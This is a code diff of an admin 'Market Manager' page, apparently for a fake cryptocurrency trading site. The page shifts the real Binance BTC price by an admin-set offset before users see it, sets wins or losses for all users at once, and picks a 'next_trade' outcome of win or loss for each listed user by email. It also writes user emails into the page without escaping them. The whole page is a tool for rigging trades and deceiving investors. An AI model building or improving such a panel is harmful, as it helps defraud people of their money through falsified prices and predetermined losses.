@@ -7,32 +7,57 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <script src="config.js"></script>
+    <style>
+        .gold-text { color: #f3ba2f; }
+        /* Animasi sederhana untuk tombol */
+        .nav-link:active { transform: scale(0.95); }
+    </style>
 </head>
 <body class="bg-[#050505] text-white p-6 font-sans">
 
-    <div class="max-w-md mx-auto space-y-6">
-        <h1 class="text-2xl font-black italic gold-text tracking-tighter">MARKET MANAGER</h1>
+    <div class="max-w-md mx-auto mb-6 flex justify-between items-center bg-[#0f0f0f] border border-white/10 p-2 rounded-2xl">
+        <div class="px-4 py-2 bg-yellow-500/10 rounded-xl">
+            <span class="text-[10px] font-black gold-text uppercase">Market Control</span>
+        </div>
+        <a href="managegrafik.html" class="nav-link flex items-center gap-2 px-4 py-2 hover:bg-white/5 rounded-xl transition-all">
+            <span class="text-[10px] font-black text-gray-400 uppercase">Manage Grafik</span>
+            <i data-lucide="chevron-right" class="w-3 h-3 text-gray-400"></i>
+        </a>
+    </div>
 
-        <div class="bg-[#0f0f0f] border border-white/10 p-6 rounded-3xl space-y-4">
+    <div class="max-w-md mx-auto space-y-6">
+        <h1 class="text-2xl font-black italic gold-text tracking-tighter uppercase">Market Manager</h1>
+
+        <div class="bg-[#0f0f0f] border border-white/10 p-6 rounded-3xl space-y-4 shadow-xl">
             <div class="grid grid-cols-2 gap-4 text-center">
-                <div><p class="text-[8px] text-gray-500 font-bold">REAL PRICE</p><p id="real-p" class="font-mono text-lg font-black italic">$0</p></div>
-                <div><p class="text-[8px] text-gray-500 font-bold">USER PRICE</p><p id="user-p" class="font-mono text-lg font-black italic text-yellow-500">$0</p></div>
+                <div>
+                    <p class="text-[8px] text-gray-500 font-bold uppercase tracking-widest">Real Price</p>
+                    <p id="real-p" class="font-mono text-lg font-black italic">$0</p>
+                </div>
+                <div>
+                    <p class="text-[8px] text-gray-500 font-bold uppercase tracking-widest">User Price</p>
+                    <p id="user-p" class="font-mono text-lg font-black italic text-yellow-500">$0</p>
+                </div>
             </div>
             <div class="flex gap-2">
-                <input type="number" id="offset" placeholder="Offset Price" class="flex-grow bg-black border border-white/10 p-3 rounded-xl text-sm font-bold">
-                <button onclick="applyOffset()" class="bg-yellow-500 text-black px-6 font-black rounded-xl text-xs">SET</button>
+                <input type="number" id="offset" placeholder="Offset Price" class="flex-grow bg-black border border-white/10 p-3 rounded-xl text-sm font-bold outline-none focus:border-yellow-500 transition-all">
+                <button onclick="applyOffset()" class="bg-yellow-500 text-black px-6 font-black rounded-xl text-xs hover:bg-yellow-400">SET</button>
             </div>
         </div>
 
         <div class="grid grid-cols-3 gap-2">
-            <button onclick="setGlobal('win')" class="bg-green-600/20 border border-green-600 p-4 rounded-2xl text-[8px] font-black">GLOBAL WIN</button>
-            <button onclick="setGlobal('normal')" class="bg-gray-600/20 border border-gray-600 p-4 rounded-2xl text-[8px] font-black">NORMAL</button>
-            <button onclick="setGlobal('loss')" class="bg-red-600/20 border border-red-600 p-4 rounded-2xl text-[8px] font-black">GLOBAL LOSS</button>
+            <button onclick="setGlobal('win')" class="bg-green-600/10 border border-green-600/30 p-4 rounded-2xl text-[8px] font-black text-green-500 hover:bg-green-600/20">GLOBAL WIN</button>
+            <button onclick="setGlobal('normal')" class="bg-gray-600/10 border border-gray-600/30 p-4 rounded-2xl text-[8px] font-black text-gray-400 hover:bg-gray-600/20">NORMAL</button>
+            <button onclick="setGlobal('loss')" class="bg-red-600/10 border border-red-600/30 p-4 rounded-2xl text-[8px] font-black text-red-500 hover:bg-red-600/20">GLOBAL LOSS</button>
         </div>
 
-        <div class="space-y-2">
-            <p class="text-[9px] font-black text-gray-500 tracking-widest uppercase">Target Specific User</p>
-            <div id="user-list" class="space-y-2"></div>
+        <div class="space-y-3">
+            <div class="flex justify-between items-center px-1">
+                <p class="text-[9px] font-black text-gray-500 tracking-widest uppercase">Target Specific User</p>
+                <button onclick="loadUsers()" class="text-[9px] font-black text-yellow-500 uppercase">Refresh</button>
+            </div>
+            <div id="user-list" class="space-y-2">
+                </div>
         </div>
     </div>
 
@@ -40,27 +65,33 @@
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getFirestore, doc, onSnapshot, setDoc, updateDoc, collection, getDocs } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
 
+        // Inisialisasi Firebase
         const app = initializeApp(APP_CONFIG.firebase);
         const db = getFirestore(app);
         let base = 0, offset = 0;
 
-        // Monitor Real Price
+        // Ambil Harga Real dari Binance
         async function fetchReal() {
-            const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
-            const d = await res.json();
-            base = parseFloat(d.price);
-            document.getElementById('real-p').innerText = "$" + base.toLocaleString();
-            document.getElementById('user-p').innerText = "$" + (base + offset).toLocaleString();
+            try {
+                const res = await fetch('https://api.binance.com/api/v3/ticker/price?symbol=BTCUSDT');
+                const d = await res.json();
+                base = parseFloat(d.price);
+                document.getElementById('real-p').innerText = "$" + base.toLocaleString();
+                document.getElementById('user-p').innerText = "$" + (base + offset).toLocaleString();
+            } catch (e) { console.error("Price fetch error"); }
         }
         setInterval(fetchReal, 1000);
 
-        // Monitor Admin Settings
+        // Pantau Pengaturan Admin (Realtime)
         onSnapshot(doc(db, "system", "market_control"), (s) => {
-            if(s.exists()){ offset = s.data().offset || 0; document.getElementById('offset').value = offset; }
+            if(s.exists()){ 
+                offset = s.data().offset || 0; 
+                document.getElementById('offset').value = offset; 
+            }
         });
 
         window.applyOffset = async () => {
-            const val = parseFloat(document.getElementById('offset').value);
+            const val = parseFloat(document.getElementById('offset').value) || 0;
             await setDoc(doc(db, "system", "market_control"), { offset: val }, { merge: true });
             alert("Offset Applied!");
         };
@@ -70,17 +101,18 @@
             alert("Global Mode: " + mode.toUpperCase());
         };
 
-        async function loadUsers() {
+        window.loadUsers = async () => {
             const snap = await getDocs(collection(db, "users"));
             const list = document.getElementById('user-list');
             list.innerHTML = "";
             snap.forEach(u => {
                 const d = u.data();
-                list.innerHTML += `<div class="bg-[#0f0f0f] p-4 rounded-2xl border border-white/5 flex justify-between items-center">
-                    <p class="text-[10px] font-bold">${d.email}</p>
+                list.innerHTML += `
+                <div class="bg-[#0f0f0f] p-4 rounded-2xl border border-white/5 flex justify-between items-center transition-all">
+                    <p class="text-[10px] font-bold text-gray-300">${d.email}</p>
                     <div class="flex gap-1">
-                        <button onclick="target('${u.id}', 'win')" class="bg-green-600 px-3 py-1 rounded text-[7px] font-bold">WIN</button>
-                        <button onclick="target('${u.id}', 'loss')" class="bg-red-600 px-3 py-1 rounded text-[7px] font-bold">LOSS</button>
+                        <button onclick="target('${u.id}', 'win')" class="bg-green-600/20 text-green-500 border border-green-600/30 px-3 py-1 rounded-lg text-[7px] font-bold">WIN</button>
+                        <button onclick="target('${u.id}', 'loss')" class="bg-red-600/20 text-red-500 border border-red-600/30 px-3 py-1 rounded-lg text-[7px] font-bold">LOSS</button>
                     </div>
                 </div>`;
             });
@@ -89,9 +121,10 @@
 
         window.target = async (id, m) => {
             await updateDoc(doc(db, "users", id), { next_trade: m });
-            alert("Target Set!");
+            alert("Target User Set: " + m.toUpperCase());
         };
 
+        // Render Icons
         lucide.createIcons();
     </script>
 </body>
